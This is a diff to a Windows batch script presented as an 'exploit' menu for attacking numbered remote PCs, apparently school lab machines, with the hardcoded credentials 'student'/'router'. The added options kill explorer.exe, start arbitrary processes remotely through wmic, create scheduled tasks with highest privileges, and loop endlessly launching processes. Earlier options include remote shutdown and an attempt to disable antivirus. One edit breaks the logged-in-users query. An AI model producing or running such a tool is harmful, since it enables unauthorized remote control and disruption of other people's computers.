@@ -26,6 +26,11 @@ echo 5. Shutdown Remote PC
 echo 6. Restart Remote PC
 echo 7. Query Logged-in Users
 echo 8. Attempt Disable AV
+echo 9. Query Services
+echo 10. Kill Explorer.exe
+echo 11. Start Process Hidden
+echo 12. Start Process with UI
+echo 13. Start Process with UI Infinitely
 echo e. Exit
 echo ------------------------
 echo Please select an exploit:
@@ -39,6 +44,11 @@ if "!option!"=="5" goto ShutdownPC
 if "!option!"=="6" goto RestartPC
 if "!option!"=="7" goto QueryUsers
 if "!option!"=="8" goto DisableAV
+if "!option!"=="9" goto QueryServices
+if "!option!"=="10" goto KillExplorer
+if "!option!"=="11" goto StartProcessHidden
+if "!option!"=="12" goto StartProcessUI
+if "!option!"=="13" goto StartProcessUIInfinite
 if "!option!"=="e" goto EndScript
 echo Invalid option, try again.
 pause
@@ -144,10 +154,9 @@ if "!pcs!"=="return" goto MainMenu
 for %%i in (!pcs!) do (
     if "!testMode!"=="1" (
         echo Querying logged-in users on !className!...
-        wmic /node:!className! /user:student /password:router ComputerSystem Get UserName
+        wmic /node:"!className!" /user:student /password:router ComputerSystem Get UserName
     ) else (
-        echo Querying logged-in users on !className!%%i...
-        wmic /node:!className!%%i /user:student /password:router ComputerSystem Get UserName
+        echo Querying logged-in users on "!className!%%i" /user:student /password:router ComputerSystem Get UserName
     )
 )
 goto ExploitComplete
@@ -168,6 +177,117 @@ for %%i in (!pcs!) do (
     )
 )
 goto ExploitComplete
+
+:QueryServices
+call :SelectPC
+if "!pcs!"=="return" goto MainMenu
+
+for %%i in (!pcs!) do (
+    if "!testMode!"=="1" (
+        echo Querying services on !className!...
+        sc \\!className! query /user:student /password:router
+    ) else (
+        echo Querying services on !className!%%i...
+        sc \\!className!%%i query /user:student /password:router
+    )
+)
+goto ExploitComplete
+
+:KillExplorer
+call :SelectPC
+if "!pcs!"=="return" goto MainMenu
+
+for %%i in (!pcs!) do (
+    if "!testMode!"=="1" (
+        echo Killing explorer.exe on !className!...
+        taskkill /S !className! /U student /P router /F /IM explorer.exe
+    ) else (
+        echo Killing explorer.exe on !className!%%i...
+        taskkill /S !className!%%i /U student /P router /F /IM explorer.exe
+    )
+)
+goto ExploitComplete
+
+:StartProcessHidden
+call :SelectPC
+if "!pcs!"=="return" goto MainMenu
+
+echo Enter the process name you want to start hidden (e.g., notepad.exe):
+set /p processName=
+
+for %%i in (!pcs!) do (
+    if "!testMode!"=="1" (
+        echo Starting !processName! hidden on !className!...
+        wmic /node:"!className!" /user:student /password:router process call create "!processName!"
+    ) else (
+        echo Starting !processName! hidden on !className!%%i...
+        wmic /node:"!className!%%i" /user:student /password:router process call create "!processName!"
+    )
+)
+goto ExploitComplete
+
+:StartProcessUI
+call :SelectPC
+if "!pcs!"=="return" goto MainMenu
+
+echo Enter the process name you want to start with UI (e.g., notepad.exe):
+set /p processName=
+
+for %%i in (!pcs!) do (
+    if "!testMode!"=="1" (
+        echo Creating scheduled task to start !processName! with UI on !className!...
+        schtasks /create /s "!className!" /u student /p router /tn "Launch!processName!" /tr "!processName!" /sc once /st 00:00 /rl highest /f
+        echo Running the scheduled task...
+        schtasks /run /s "!className!" /u student /p router /tn "Launch!processName!"
+    ) else (
+        echo Creating scheduled task to start !processName! with UI on !className!%%i...
+        schtasks /create /s "!className!%%i" /u student /p router /tn "Launch!processName!" /tr "!processName!" /sc once /st 00:00 /rl highest /f
+        echo Running the scheduled task...
+        schtasks /run /s "!className!%%i" /u student /p router /tn "Launch!processName!"
+    )
+)
+goto ExploitComplete
+
+
+:StartProcessUIInfinite
+call :SelectPC
+if "!pcs!"=="return" goto MainMenu
+
+echo Enter the process name you want to start infinitely with UI (e.g., notepad.exe):
+set /p processName=
+
+for %%i in (!pcs!) do (
+    if "!testMode!"=="1" (
+        echo [INFO] Test mode enabled for !className!
+        :InfiniteLoopTest
+        set "taskName=Launch_!processName!_Test%random%"
+        echo [INFO] Creating scheduled task to start !processName! with UI on !className!...
+        timeout /t 2 /nobreak >nul
+        schtasks /create /s "!className!" /u student /p router /tn "!taskName!" /tr "!processName!" /sc once /st 00:00 /rl highest /f
+        echo [INFO] Scheduled task created, running the task...
+        timeout /t 2 /nobreak >nul
+        schtasks /run /s "!className!" /u student /p router /tn "!taskName!"
+        echo [INFO] Task completed. Looping...
+        timeout /t 2 /nobreak >nul
+        goto InfiniteLoopTest
+    ) else (
+        echo [INFO] Normal mode enabled for !className!%%i
+        :InfiniteLoop
+        set "taskName=Launch_!processName!_%%i_%random%"
+        echo [INFO] Creating scheduled task to start !processName! with UI on !className!%%i...
+        timeout /t 2 /nobreak >nul
+        schtasks /create /s "!className!%%i" /u student /p router /tn "!taskName!" /tr "!processName!" /sc once /st 00:00 /rl highest /f
+        echo [INFO] Scheduled task created, running the task...
+        timeout /t 2 /nobreak >nul
+        schtasks /run /s "!className!%%i" /u student /p router /tn "!taskName!"
+        echo [INFO] Task completed. Looping...
+        timeout /t 2 /nobreak >nul
+        goto InfiniteLoop
+    )
+)
+goto ExploitComplete
+
+
 
 :SelectPC
 cls
@@ -198,4 +318,5 @@ goto MainMenu
 
 :EndScript
 endlocal
+pause
 exit /b
